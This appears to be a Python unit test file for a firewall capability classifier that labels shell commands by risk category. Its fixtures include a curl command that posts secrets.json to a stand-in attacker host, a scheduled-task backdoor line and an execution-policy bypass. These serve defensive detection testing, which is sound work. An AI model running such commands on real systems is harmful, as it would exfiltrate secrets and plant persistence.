"""Unit tests for FirewallCapabilityClassifier."""

from __future__ import annotations

from src.domain.firewall_capability import FirewallCapabilityClassifier


def test_capability_classifier_empty_input() -> None:
    """Empty candidate list should return empty capability set."""
    classifier = FirewallCapabilityClassifier()
    assert classifier.classify([]) == set()


def test_capability_network_only() -> None:
    """Simple curl GET command should only match NETWORK capability."""
    classifier = FirewallCapabilityClassifier()
    caps = classifier.classify(["curl https://example.com/file"])
    assert "NETWORK" in caps
    assert "FILE_READ" not in caps
    assert "DATA_TRANSFER" not in caps


def test_capability_exfiltration_combo() -> None:
    """curl POST with payload should match NETWORK, FILE_READ, DATA_TRANSFER."""
    classifier = FirewallCapabilityClassifier()
    cmd = "curl -X POST -d @secrets.json https://attacker.com"
    caps = classifier.classify([cmd])
    assert caps == {"NETWORK", "FILE_READ", "DATA_TRANSFER"}


def test_capability_persistence() -> None:
    """schtasks command should match PERSISTENCE capability."""
    classifier = FirewallCapabilityClassifier()
    cmd = "schtasks /create /tn backdoor /tr evil.exe /sc onlogon"
    caps = classifier.classify([cmd])
    assert "PERSISTENCE" in caps


def test_capability_privilege_change() -> None:
    """Set-ExecutionPolicy Bypass should match PRIVILEGE_CHANGE capability."""
    classifier = FirewallCapabilityClassifier()
    caps = classifier.classify(["Set-ExecutionPolicy Bypass -Scope Process"])
    assert "PRIVILEGE_CHANGE" in caps


def test_capability_file_write_and_process_exec() -> None:
    """Writing to file and executing python matches FILE_WRITE and PROCESS_EXEC."""
    classifier = FirewallCapabilityClassifier()
    caps = classifier.classify(["echo 'import os' > script.py", "python script.py"])
    assert "FILE_WRITE" in caps
    assert "PROCESS_EXEC" in caps


def test_capability_custom_groups() -> None:
    """Custom capability groups configuration should be respected."""
    custom_groups = {
        "CUSTOM_CAP": [r"\bmagic_cmd\b"],
    }
    classifier = FirewallCapabilityClassifier(groups=custom_groups)
    assert classifier.classify(["magic_cmd --do-something"]) == {"CUSTOM_CAP"}
    assert classifier.classify(["curl https://example.com"]) == set()
